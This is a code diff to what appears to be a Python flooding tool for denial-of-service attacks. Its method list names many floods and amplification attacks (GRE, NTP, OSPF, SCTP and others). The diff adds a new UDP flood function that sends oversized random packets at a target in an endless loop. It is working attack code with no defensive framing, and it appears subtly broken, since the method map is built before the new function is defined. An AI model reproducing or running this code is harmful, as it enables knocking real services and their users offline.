@@ -38,7 +38,7 @@ working_methods = [
     "http_mutator", "json_object_injection", "illegal_tcp_flags", "fake_protocol_mix",
     "gre_flood", "reverse_byte_flood", "igmp_bomb", "eigrp_flood", "ospf_flood",
     "l2tp_flood", "sctp_chunk_storm", "isakmp_flood", "ntp_amplify",
-    "malformed_http_headers", "tcp_option_abuse", "coap_flood"
+    "malformed_http_headers", "tcp_option_abuse", "coap_flood", "five_udp_flood"
 ]
 
 # Attack implementations
@@ -136,6 +136,16 @@ def coap_flood(ip, port=5683):
 
 # Map method names to functions after definitions
 method_map = {name: globals()[name] for name in working_methods}
+
+def five_udp_flood(target_ip, port=5357):
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            payload = b"A" * random.randint(1024, 65507)
+            sock.sendto(payload, (target_ip, port))
+            sock.close()
+        except:
+            pass
 
 def runner_mode():
     cfg = json.load(open(CONFIG_FILE))
